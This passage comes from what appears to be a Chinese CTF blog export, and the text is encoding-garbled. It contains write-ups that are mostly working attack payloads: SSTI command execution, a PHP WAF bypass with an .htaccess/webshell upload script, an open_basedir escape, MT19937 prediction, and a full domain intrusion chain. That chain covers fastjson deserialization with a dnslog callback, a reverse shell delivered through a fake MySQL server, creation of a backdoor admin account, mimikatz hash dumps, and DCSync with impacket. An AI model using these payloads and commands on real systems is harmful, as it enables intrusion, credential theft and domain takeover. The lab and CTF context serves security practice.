c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="tornado">tornado</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">117.78</span><span class="number">.26</span><span class="number">.79</span>:<span class="number">31093</span>/error?msg=&#123;&#123;handler.settings&#125;&#125; <span class="comment">#è·å–ç¯å¢ƒå˜é‡ï¼Œå³å¯è·å¾—cookie</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>buuåˆ·é¢˜è®°å½•ï¼š[SUCTF_2019]EasyWeb</title>
    <url>/2022/07/24/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A-SUCTF-2019-EasyWeb/</url>
    <content><![CDATA[<p>é¢˜ç›®é¦–å…ˆç»™å‡ºäº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = <span class="title function_ invoke__">count_chars</span>(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><span id="more"></span></p>
<p>ç¬¬ä¸€æ­¥çš„æ€è·¯å°±æ˜¯ç»•è¿‡wafæ‰§è¡Œget_the_flagå‡½æ•°ï¼Œå¼‚æˆ–ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒæ­¥ä¸Šä¼ æ–‡ä»¶ï¼Œbase64ç¼–ç å†è§£ç </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .abc</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.abc&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://edaa6186-d365-4fdb-bcc8-d15d8c36cb3b.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line"> </span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"> </span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.abc&#x27;</span>,shell,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸‰æ­¥ç»•è¿‡open_basedirï¼Œè¿™ä¸ªå‡½æ•°è§„å®šæ´»åŠ¨çš„æ–‡ä»¶å¤¹èŒƒå›´ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>img%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>img%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>));</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>buuåˆ·é¢˜è®°å½•ï¼š[pasecactf_2019]tornado_casino</title>
    <url>/2022/06/03/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A%5Bpasecactf_2019%5Dtornado_casino/</url>
    <content><![CDATA[<p>é¦–å…ˆæ‰“å¼€pyæ–‡ä»¶çœ‹ä¸€çœ¼ï¼Œè¾“3é€€å‡ºï¼Œè¾“2å†è¾“b33_1_4m_b3333ä¼šè®©æŸä¸ªè‡ªå‡çš„ä¸œè¥¿åŠ ä¸€åƒï¼Œè¾“1æ—¶ä¼šç”Ÿæˆä¸€ä¸ª32ä½çš„éšæœºæ•°ï¼Œå¹¶ä¸”å°†è¾“å…¥çš„éšæœºæ•°ä¸å…¶è‡ªå·±ç”Ÿæˆçš„éšæœºæ•°æ¯”è¾ƒï¼Œç›¸ç­‰åˆ™è¿”å›flagã€‚</p>
<p>é‚£ä¹ˆé¢˜ç›®çš„æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼šç”Ÿæˆ624ä¸ªéšæœºæ•°å¹¶ä¸”ä½¿ç”¨randcrackåº“è®¡ç®—ç¬¬625ä¸ªéšæœºæ•°ä¸Šä¼ å³å¯ã€‚</p>
<span id="more"></span>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29318</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[3] - Exit\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Enter your promocode:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;b33_1_4m_b3333&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[3] - Exit\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">num = []</span><br><span class="line"></span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;[$] - $$$SPIN$$$\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;$&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;It will be:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1234&#x27;</span>)</span><br><span class="line">    data = sh.recvline()</span><br><span class="line">    data = <span class="built_in">str</span>(data)</span><br><span class="line">    data1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        data1 += data[<span class="number">4</span> + <span class="number">2</span> * j]</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(data1, <span class="number">16</span>))</span><br><span class="line">aa = rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[$] - $$$SPIN$$$\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;$&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;It will be:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">hex</span>(aa).encode())</span><br><span class="line">sh.recvlines(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>flag:ã€€flag{b346a745-1b98-4908-8e2e-7b25d3d5a46f}</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>mt19937</tag>
        <tag>pwntools</tag>
      </tags>
  </entry>
  <entry>
    <title>exchange_wp</title>
    <url>/2023/08/05/exchange-wp/</url>
    <content><![CDATA[<h1 id="exchange">exchange</h1>
<p>æ„Ÿè°¢æä¾›ç¯å¢ƒçš„hxdğŸ¥°</p>
<p>æ˜¥ç§‹äº‘å¢ƒçš„é¶ç¡®å®å¼º</p>
<span id="more"></span>
<h2 id="flag01">flag01</h2>
<p>å¼€å±€æ‰«IPï¼Œå¼€äº†22,80,8000</p>
<p>80æ˜¯ä¸ªphpçš„ç«™ï¼Œæ²¡æ‰¾åˆ°å•¥ä¸œè¥¿</p>
<p>8000æ˜¯Javaçš„lumia erpï¼Œæ‰¾äº†ä¸€äº›åŠŸèƒ½ç‚¹å‘ç°éƒ½æ˜¯jsonä¼ çš„</p>
<p>å‘ç°lumia erpæœ‰ä¸ªawdå‡ºè¿‡ï¼Œç‚¹æ˜¯fastjson 1.2.68ååºåˆ—åŒ–ï¼Œæ‰¾ä¸ªåœ°æ–¹éªŒè¯ä¸€ä¸‹ï¼Œéœ€è¦å…¨å­—ç¬¦URLç¼–ç </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;ebhd3z.dnslog.cn&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/08/05/v5cO6IDl2wQTKbV.png"></p>
<p>éªŒè¯fastjsonç‰ˆæœ¬ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.InetSocketAddress&quot;</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ebhd3z.dnslog.cn&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/08/05/rqAz9LZ27mp1RFV.png"></p>
<p>æœåŠ¡å™¨èµ·ä¸€ä¸ª<a href="https://github.com/fnmsd/MySQL_Fake_Server">fake mysql server</a>ï¼Œéœ€è¦<a href="https://github.com/frohoff/ysoserial">ysoserial</a>çš„jaræ–‡ä»¶</p>
<p>config.jsonæ”¹ä¸€ä¸‹jaråœ°å€ä»¥åŠåŠ ä¸€æ¡ç”¨cc6å¼¹shellçš„å‘½ä»¤</p>
<p><img src="https://s2.loli.net/2023/08/05/kpSjRAw56FPVvto.png"></p>
<p>èµ·æœåŠ¡åæœåŠ¡ç«¯å‘åŒ…å³å¯</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hostToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.1.1.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;portToConnectTo&quot;</span><span class="punctuation">:</span> <span class="number">3306</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CommonsCollections6&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pas&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;detectCustomCollations&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;NUM_HOSTS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;databaseToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/08/05/pzFvqJtaxbu8Nek.png"></p>
<p>flag01:</p>
<p><img src="https://s2.loli.net/2023/08/05/16CJPhYvQfigUFx.png"></p>
<h2 id="flag02">flag02</h2>
<p>ä¼ ä¸€ä¸ªfscanæ‰«å†…ç½‘</p>
<p><img src="https://s2.loli.net/2023/08/05/UIaTrnogXLG5W6D.png"></p>
<p>2å’Œ9éƒ½æ˜¯windowsçš„æœºå™¨ï¼Œå…¥å£æ˜¯12ï¼Œ26æ˜¯ä¸ªä¸ªäººpcï¼Œç”¨frpä»£ç†socks5å‡ºæ¥ï¼ŒKaliä¸Šé…ä¸€ä¸‹proxychainså³å¯</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 8081</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
<p>9æœ‰ä¸€ä¸ªoutlookï¼Œæ‰¾åˆ°ä¸€ä¸ª<a href="https://github.com/herwonowr/exprolog">åˆ©ç”¨å·¥å…·</a>å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://s2.loli.net/2023/08/05/k9WV2bAE4XIlcYa.png"></p>
<p>æ·»åŠ ä¸€ä¸ªè´¦æˆ·æ“ä½œ</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">net user sha999 pass@123 /add</span><br><span class="line">net localgroup administrators sha999 /add</span><br></pre></td></tr></table></figure>
<p>å¯†ç éœ€è¦å­—æ¯æ•°å­—ç‰¹æ®Šå­—ç¬¦ï¼Œä¸ç„¶çš„è¯ä¼šåˆ›å»ºå¤±è´¥</p>
<p>remminaç™»å½•ï¼Œæ‹¿åˆ°flag02</p>
<p><img src="https://s2.loli.net/2023/08/05/t5oLuIHfc9kMAzg.png"></p>
<h2 id="flag04">flag04</h2>
<p>mimikatzæŠ“ä¸€ä¸‹hash</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span> &gt; <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Authentication Id : 0 ; 100176 (00000000:00018750)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2023/8/5 13:31:52</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : Zhangtong</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line">	 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line">	 * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : Zhangtong</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : Zhangtong</span><br><span class="line">	 * Domain   : XIAORANG.LAB</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line">Authentication Id : 0 ; 10102536 (00000000:009a2708)</span><br><span class="line">Session           : Interactive from 4</span><br><span class="line">User Name         : DWM-4</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/8/5 13:53:06</span><br><span class="line">SID               : S-1-5-90-0-4</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : XIAORANG-EXC01$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : b2fdb13f284a5249f3657fb155b9ed01</span><br><span class="line">	 * SHA1     : b400c19ab343b632d23937cea02cf731088f9fd2</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : XIAORANG-EXC01$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : XIAORANG-EXC01$</span><br><span class="line">	 * Domain   : xiaorang.lab</span><br></pre></td></tr></table></figure>
<p>ä¸€ä¸ªåŸŸç”¨æˆ·zhangtongå’Œsystemç”¨æˆ·</p>
<p>ç„¶åç”¨bloodhoundåˆ†æä¸€ä¸‹åŸŸç¯å¢ƒï¼ŒåˆšåŠ çš„ç”¨æˆ·æ²¡æœ‰åŸŸæƒé™ï¼Œéœ€è¦ç”¨exchangeçš„expæ‰“çš„é‚£ä¸ªshellæ‰§è¡Œ</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">proxychains <span class="built_in">curl</span> <span class="literal">--request</span> POST <span class="literal">--url</span> https://<span class="number">172.22</span>.<span class="number">3.9</span>/owa/auth/k7su8.aspx <span class="literal">--header</span> <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> <span class="literal">--data</span> <span class="string">&#x27;request=Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;C:/Users/sha999/Desktop/SharpHound.exe -c all --OutputDirectory C:/Users/sha999/Desktop&quot;).stdout.readall())&#x27;</span> <span class="literal">-k</span></span><br></pre></td></tr></table></figure>
<p>æŠŠç”Ÿæˆçš„zipå¯¼åˆ°æœ¬åœ°åˆ†æï¼Œå‚è€ƒ<a href="https://www.freebuf.com/articles/web/288370.html">æ¸—é€æµ‹è¯•ä¹‹å†…ç½‘æ”»é˜²ç¯‡ï¼šä½¿ç”¨ BloodHound åˆ†æå¤§å‹åŸŸå†…ç¯å¢ƒ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<p><img src="https://s2.loli.net/2023/08/05/rEiGmcyoktsFLU8.png"></p>
<p>å¯ä»¥çœ‹åˆ°exchangeæœºå™¨æ˜¯æœ‰writedaclæƒé™çš„ï¼Œå¯ä»¥åˆ©ç”¨WriteDaclæƒé™æ·»åŠ Zhangtongçš„DCSyncæƒé™</p>
<p>ä½¿ç”¨psexecè¿æ¥systemç”¨æˆ·æ·»åŠ æƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains impacket-psexec -hashes :b2fdb13f284a5249f3657fb155b9ed01 XIAORANG/XIAORANG-EXC01\<span class="variable">$@172</span>.22.3.9</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/08/05/lWr3ZxIyDpUuGEg.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -command &quot;cd C:/Users/sha999/Desktop/; Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity &#x27;DC=xiaorang,DC=lab&#x27; -PrincipalIde Zhangtong -Rights DCSync -Verbose&quot;</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a></p>
<p>secretsdumpå¯¼ä¸€ä¸‹åŸŸçš„hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains impacket-secretsdump xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/08/05/8aCutz7BSP6fTbG.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::</span><br></pre></td></tr></table></figure>
<p>åŒæ ·åˆ›å»ºç”¨æˆ·ç™»å½•</p>
<p><img src="https://s2.loli.net/2023/08/05/nEJgDr5eKPiuyI8.png"></p>
<h2 id="flag03">flag03</h2>
<p>åŸŸæ§æ”¹ä¸€ä¸‹26pcçš„å¯†ç ï¼Œç™»è¿›å»çœ‹çœ‹</p>
<p><img src="https://s2.loli.net/2023/08/05/otOiqx6Ekup4F8S.png"></p>
<p>æ¡Œé¢ä¸Šæœ‰ä¸ªå‹ç¼©åŒ…éœ€è¦å¯†ç </p>
<p>åœ¨exchangeé‡Œé¢ä½¿ç”¨lumiaçš„å¯†ç ç™»å½•å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªé‚®ä»¶ï¼Œå¯†ç æ˜¯csvé‡Œçš„æŸä¸ªç”µè¯</p>
<p><img src="https://s2.loli.net/2023/08/05/VBSrawoetZQsGvT.png"></p>
<p>æ‹–å‡ºæ¥ç›´æ¥çˆ†ç ´</p>
<p><img src="https://s2.loli.net/2023/08/05/sIR9jrTvdDlZiph.png"></p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>pythonç¯å¢ƒé…ç½®</title>
    <url>/2022/09/27/python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="å®‰è£…anaconda">1.å®‰è£…anaconda</h2>
